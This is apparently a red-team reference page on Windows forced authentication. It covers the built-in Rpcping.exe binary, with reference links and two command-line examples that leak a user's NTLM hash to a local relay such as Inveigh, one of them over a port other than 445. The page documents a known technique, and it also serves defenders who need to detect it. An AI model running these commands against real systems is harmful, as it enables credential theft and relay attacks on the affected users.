<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Windows Forced Authentication

* LOLBAS -<br />
	* <details><summary>Rpcping.exe (Click to expand)</summary><p>
		* References
			* [https://twitter.com/vysecurity/status/974806438316072960](https://twitter.com/vysecurity/status/974806438316072960)
			* [https://twitter.com/vysecurity/status/873181705024266241](https://twitter.com/vysecurity/status/873181705024266241)
			* [https://twitter.com/splinter_code/status/1421144623678988298](https://twitter.com/splinter_code/status/1421144623678988298)
			* [https://github.com/vysecurity/RedTips](https://github.com/vysecurity/RedTips)
		* Notes
			* Forced Authentication by user
		* Examples
			* Example 1: First run local relay like inveigh, then target with -s

					rpcping -s 127.0.0.1 -t ncacn_np to leak hash
			* Example 2: leak hash over port besides 445

					rpcping  -s 127.0.0.1 -e 1234 -a privacy -u NTLM